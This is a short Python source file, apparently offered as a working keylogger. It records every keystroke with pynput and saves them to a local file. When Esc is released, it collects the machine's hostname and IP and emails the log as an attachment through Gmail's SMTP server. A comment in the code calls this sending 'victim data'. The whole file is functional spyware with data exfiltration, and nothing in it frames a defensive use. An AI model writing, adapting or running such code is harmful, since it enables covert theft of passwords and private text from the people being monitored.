# Python KeyLogger

import pynput
import smtplib 
import socket
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

filename = "save.txt"
count = 0;
keys = [];

def handle_press(key):
    global keys, count;
    keys.append(key);
    print(keys);
    count += 1;
    print(key);
    if count >= 10:
        count = 0;
        save(keys);
        keys = [];

def save(keys):
    global filename;
    with open(filename, "a") as file:
        for key in keys:
            _key = str(key).replace("'", "");
            if _key.find("space") > 0:
                file.write(" ");
            elif _key.find("enter") > 0:
                file.write("\n");
            elif _key.find("key") == -1:
                file.write(_key);

def handle_release(key):
    global filename;
    if key == Key.esc:
        # Send victim data via email
        _from = "username@gmail.com";
        from_pwd = "your_password";
        hostname = socket.gethostname();
        ip_address = socket.gethostbyname(hostname);
        subject = ip_address;
        body = "Victim {} with IP {} data".format(hostname, ip_address);
        
        send_mail(_from,
            _from,
            subject,
            body,
            filename,
            from_pwd
            );

        return False;

def send_mail(_from, to, subject, body, filename, from_pwd):
    msg = MIMEMultipart();
    msg['To'] = to;
    msg['Subject'] = subject;
    msg.attach(MIMEText(body, "plain"));
    attachment = open(filename, "rb");
    p = MIMEBase('application', 'octet-stream');
    p.set_payload((attachment).read());
    encoders.encode_base64(p);
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename);
    msg.attach(p);
    s = smtplib.SMTP('smtp.gmail.com', 587);
    s.starttls();
    s.login(_from, from_pwd);
    text = msg.as_string(); 
    s.sendmail(_from, to, text); 
    s.quit();

with Listener(on_press=handle_press,
    on_release=handle_release) as listener:
        listener.join();
